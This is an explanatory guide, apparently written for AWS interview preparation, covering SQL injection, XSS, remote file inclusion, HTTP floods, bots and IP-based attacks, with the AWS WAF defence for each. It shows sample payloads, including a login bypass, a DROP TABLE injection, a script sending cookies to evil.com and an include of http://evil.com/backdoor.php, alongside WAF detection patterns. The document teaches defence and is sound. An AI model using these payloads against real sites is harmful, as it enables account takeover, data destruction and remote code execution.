Let's go through each attack in detail, including **how the attack works**, **an example**, **its impact**, and **how AWS WAF defends against it**.

---

# 1. SQL Injection (SQLi)

## What is it?

SQL Injection is an attack where an attacker inserts malicious SQL code into an application's input fields to manipulate the database.

Instead of treating user input as data, the application mistakenly treats it as part of an SQL query.

---

## Normal Login

Suppose your application executes:

```sql
SELECT * FROM users
WHERE username='vimal'
AND password='mypassword';
```

Everything is normal.

---

## Malicious Input

Attacker enters

```
Username:
admin

Password:
' OR '1'='1
```

The query becomes

```sql
SELECT *
FROM users
WHERE username='admin'
AND password='' OR '1'='1';
```

Since

```
'1'='1'
```

is always true,

the database returns the admin account.

The attacker logs in without knowing the password.

---

## Worse Example

Attacker enters

```
'; DROP TABLE users; --
```

Query becomes

```sql
SELECT * FROM users
WHERE username='';
DROP TABLE users;
```

The database may execute

```
DROP TABLE users
```

destroying the table.

---

## Impact

* Login bypass
* Steal customer information
* Delete database
* Modify records
* Execute administrative commands

---

## AWS WAF Protection

AWS Managed SQL Injection Rule scans

* Query strings
* POST bodies
* Cookies
* Headers
* URI parameters

If it detects SQL keywords like

```
UNION SELECT
DROP TABLE
OR 1=1
SLEEP()
```

it blocks the request before it reaches your application.

---

# 2. Cross Site Scripting (XSS)

## What is it?

XSS injects malicious JavaScript into a website.

Instead of attacking the server,

the attacker attacks **other users visiting the website**.

---

## Example

Suppose a comment section accepts

```
Great article!
```

The attacker submits

```html
<script>
document.location='https://evil.com?cookie='+document.cookie;
</script>
```

The application stores it.

When another user opens the page,

their browser executes

```javascript
document.cookie
```

and sends their session cookie to

```
evil.com
```

The attacker can hijack the user's session.

---

## Impact

* Session hijacking
* Steal cookies
* Fake login forms
* Redirect users
* Run arbitrary JavaScript

---

## AWS WAF Protection

AWS WAF detects patterns like

```html
<script>
```

```
javascript:
```

```
onload=
```

```
onerror=
```

and blocks them.

---

# 3. Remote File Inclusion (RFI)

## What is it?

Some applications allow loading external files.

For example

```
https://myapp.com/page?file=home.php
```

Internally

```php
include($_GET["file"]);
```

---

## Attack

Attacker changes

```
file=http://evil.com/backdoor.php
```

Now the server executes

```php
include("http://evil.com/backdoor.php");
```

The attacker gains remote code execution.

---

## Impact

* Execute malicious code
* Install malware
* Gain server access
* Read files
* Delete files

---

## AWS WAF Protection

WAF blocks suspicious URLs such as

```
http://evil.com
```

```
ftp://
```

```
../../
```

```
file://
```

before they reach the application.

---

# 4. HTTP Flood Attack

## What is it?

This is an application-layer (Layer 7) DDoS attack.

Instead of overwhelming the network,

the attacker overwhelms your application with legitimate-looking HTTP requests.

---

## Example

A normal user

```
1 request/sec
```

Bot

```
1000 requests/sec
```

Thousands of bots

```
500,000 requests/sec
```

Your application spends CPU time processing requests.

Eventually

* CPU reaches 100%
* Memory fills
* Thread pools become exhausted
* Users receive HTTP 503 errors

---

## Impact

* Slow website
* API timeouts
* High AWS costs
* Service outage

---

## AWS WAF Protection

Rate-based rules

Example

```
If IP > 2000 requests in 5 minutes

Block
```

or

```
Challenge (proof-of-work)
```

or

```
CAPTCHA
```

before forwarding traffic.

---

# 5. Malicious Bots

## What are Bots?

Bots are automated programs.

Some are good.

Some are bad.

---

### Good Bots

* Google Search
* Bing
* AWS Health Checker

---

### Bad Bots

* Credential stuffing
* Web scraping
* Inventory hoarding
* Scalping
* Spam

---

## Example

Ticket website

Bot buys

```
100 tickets
```

within

```
0.5 seconds
```

Real customers cannot purchase tickets.

---

Another example

Bot sends

```
1 million login attempts
```

using leaked passwords.

This is called

**Credential Stuffing**.

---

## AWS WAF Protection

AWS Bot Control identifies

* Known bot signatures
* Browser anomalies
* Suspicious behavior
* Missing JavaScript execution
* Automated request patterns

Actions include

* Block
* CAPTCHA
* Challenge
* Rate limit

---

# 6. IP-Based Attacks

## What is it?

Attackers repeatedly use specific IP addresses to target your application.

Examples

* Brute-force login
* Port scanning
* Credential stuffing
* Repeated scraping
* Abuse from known malicious networks

---

## Example

Attacker

```
192.168.x.x
```

tries

```
password1
password2
password3
...
```

against

```
/login
```

100,000 times.

---

Another example

An IP scans

```
/admin
/config
/.env
/phpinfo
```

looking for vulnerabilities.

---

## AWS WAF Protection

You can:

* Block specific IP addresses
* Allow trusted IPs only
* Use IP reputation lists
* Block anonymous proxies and VPNs (with appropriate managed rule sets)
* Block TOR exit nodes (through threat intelligence or managed rules)
* Combine IP filtering with rate limits

---

# Summary

| Attack                          | Goal                                                              | Example                                         | AWS WAF Defense                                                                    |
| ------------------------------- | ----------------------------------------------------------------- | ----------------------------------------------- | ---------------------------------------------------------------------------------- |
| **SQL Injection (SQLi)**        | Manipulate the database                                           | `OR 1=1`, `UNION SELECT`                        | SQLi managed rules inspect requests and block malicious SQL patterns               |
| **Cross-Site Scripting (XSS)**  | Execute malicious JavaScript in users' browsers                   | `<script>...</script>`                          | XSS rules detect and block script payloads                                         |
| **Remote File Inclusion (RFI)** | Execute remote code on the server                                 | `file=http://evil.com/shell.php`                | Rules detect suspicious file inclusion patterns and malicious URLs                 |
| **HTTP Flood Attack**           | Exhaust application resources with excessive HTTP requests        | Thousands of GET/POST requests per second       | Rate-based rules, CAPTCHA, and Challenge actions throttle or block abusive clients |
| **Malicious Bots**              | Automate abuse such as scraping, credential stuffing, or scalping | Login bots or ticket-purchasing bots            | AWS Bot Control identifies bot behavior and blocks or challenges automated traffic |
| **IP-Based Attacks**            | Abuse from known or suspicious IP addresses                       | Brute-force logins, scanning, repeated requests | IP allow/block lists, reputation lists, geo restrictions, and rate limiting        |

For **AWS Solutions Architect** and **DevOps** interviews, it's also useful to understand **where AWS WAF fits in the request path** (CloudFront, ALB, API Gateway), how it works with **AWS Shield Standard/Advanced**, and how to design layered protection using **Security Groups**, **NACLs**, and **WAF** together.
